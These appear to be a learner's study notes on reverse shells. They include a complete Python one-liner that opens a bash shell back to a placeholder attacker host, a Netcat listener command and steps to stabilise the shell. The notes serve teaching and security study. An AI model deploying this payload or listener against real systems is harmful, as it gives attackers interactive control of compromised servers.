# reverse-shell

28/05/25

## Recall

- What is a reverse shell?
- Why does it bypass firewalls?
- What is a socket?
- What is the TCP 3-way handshake?
- What are file descriptors (`stdin`, `stdout`, `stderr`)?
- What does `os.dup2()` do?
- How to stabilize the reverse shell?

## Notes

### What it is

A reverse shell is a technique used to force a target server to initiate a connection back to the attacker's machine, effectively turning the server into a **client** in the communication model.

The TCP/IP model operates primarily on a **client-server** communication ****paradigm, where:

- The **client** initiates a request.
- The **server** listens on a specific port and responds to incoming requests.

To manage connections, operating systems use something called **sockets**.

A socket is the combination of:

- An **IP address**, which identifies the machine on the network.
- A **port number**, which identifies the specific service or process listening on that machine.

For example:

| Service | Port |
| --- | --- |
| HTTP | 80 |
| SSH | 22 |
| HTTPS | 443 |

When you visit `https://example.com`, your computer acts as the **client**, sending a request to the server’s IP on port 443, which is where the HTTPS service is listening

Every TCP connection starts with a handshake process to establish a reliable connection between client and server. This is known as the **3-Way Handshake**.

1. **SYN:** The client sends a synchronization packet to request a connection.
2. **SYN-ACK:** The server acknowledges the request and replies with SYN-ACK.
3. **ACK:** The client responds with an acknowledgment.

The connection is now established and data can flow.

A **reverse shell** flips this normal process. Instead of the attacker connecting to the target (like a traditional client-server interaction), the target server initiates the connection to the attacker’s machine.

This inversion has a very practical reason: firewalls and NAT devices commonly block inbound connections, but they usually allow outbound connections, especially on common ports.

Once the target connects back to the attacker's listener the attacker can respond however they want — sending commands, payloads, or malicious input. Commonly, the attacker establish a command line interface, aiming for lateral moving and escalating privileges.

### How to exploit it

To establish a reverse shell, the first requirement is to gain some form of **Remote Code Execution (RCE)** that allows arbitrary command execution on the target server.

Once RCE is achieved, the next step is to construct a payload. To do this, you need to identify a scripting language available on the target machine. On most Linux servers, **Python is a reliable choice**.

**Payload example:**

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("attacker-ip", attacker-port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/bash","-i"]);'
```

**Breaking Down the Payload — Step by Step:**

**Identifying the python binary:**

```bash
which python || which python3
```

Once confirmed, you can proceed to execute the payload.

**Importing required libraries:**

```bash
import socket
import subprocess
import os
```

Loads three essential modules:

- `socket`: handles the creation of the socket and manages the TCP connection.
- `subprocess`: executes commands on the system — here, it opens a shell.
- `os`: handles file descriptors — stdin (input), stdout (output), and stderr (errors).

**Creating the socket:**

```bash
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

Defines the socket parameters:

- `AF_INET`: specifies the use of IPv4 (use `AF_INET6` for IPv6).
- `SOCK_STREAM`: specifies a TCP connection (for UDP, it would be `SOCK_DGRAM`).

**Connecting to the attacker machine:**

```bash
s.connect(("<IP>", <PORT>))
```

Establishes a TCP connection with:

- **Attacker IP:** `10.0.0.1`
- **Port:** `9999`

This triggers the TCP handshake (SYN → SYN-ACK → ACK) and opens the connection.

**Redirecting standard streams:**

```bash
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
```

`s.fileno()` retrieves the **file descriptor** of the socket (an integer representing the open socket at the OS level).

`os.dup2()` duplicates the socket's file descriptor into the standard streams:

| File Descriptor | Function | Redirect to |
| --- | --- | --- |
| `0` | stdin (input) | Socket |
| `1` | stdout (output) | Socket |
| `2` | stderr (errors) | Socket |
- Everything you type in the attacker's Netcat listener **→ becomes input for the remote bash shell.**
- Everything the bash shell outputs **→ is sent back to your Netcat listener as stdout or stderr.**

**Spawning the shell:**

```bash
subprocess.call(["/bin/bash", "-i"])
```

- Launches an **interactive bash shell** (`i` for interactive mode).
- The shell behaves as if you were using a local terminal on the target, but over the TCP connection.

If `/bin/bash` is unavailable, you can use `/bin/sh` as an alternative.

**Setting up the listener:**

```bash
nc -lvnp <PORT>
```

On the attacker machine, open a listener with Netcat:

- **`l`** → Listen mode.
- **`v`** → Verbose output (optional but useful).
- **`n`** → Do not resolve DNS (optional).
- **`p`** → Specify the port.

**Stabilization**

When you get a reverse shell using this method, the shell is functional but limited. It typically lacks features like command history, line editing, tab completion etc.

This happens because the reverse shell is not running inside a **PTY (Pseudo-Terminal)** — it's simply a raw input/output stream over TCP.

To spawn a PTY, on the target machine, run:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This forces the shell to spawn inside a pseudo-terminal, improving interactivity.

Fixing the local terminal:

```bash
Ctrl + Zfg
stty raw -echo
fg
```

- **`Ctrl + Z`** → Suspends the Netcat process (puts it in the background).
- **`stty raw -echo`** → Configures the local terminal to **raw mode**, disabling local input processing like line buffering and echo. This prevents issues with backspace, arrow keys, and special characters.
- **`fg`** → Brings the Netcat process back to the foreground, now with the terminal in raw mode.

Setting the TERM variable:

```bash
export TERM=xterm
```

This sets the `TERM` environment variable, which is required by most interactive Linux applications (`top`, `htop`, `vim`, `nano`, `less`, etc.) to correctly handle screen control, formatting, and keyboard input.

After these steps, the reverse shell behaves much more like a real interactive terminal, with functional line editing, history, and screen management.

## Summary

A reverse shell is a technique where the target machine initiates a connection back to the attacker, allowing remote command execution. This works by creating a TCP socket that redirects standard input, output, and error streams (stdin, stdout, stderr) over the network, effectively transforming the socket into a remote terminal. Reverse shells are commonly used to bypass firewalls and NAT, since outbound connections are typically allowed. However, the shell often lacks interactivity because it doesn't run inside a PTY, requiring manual steps to stabilize it and simulate a real terminal environment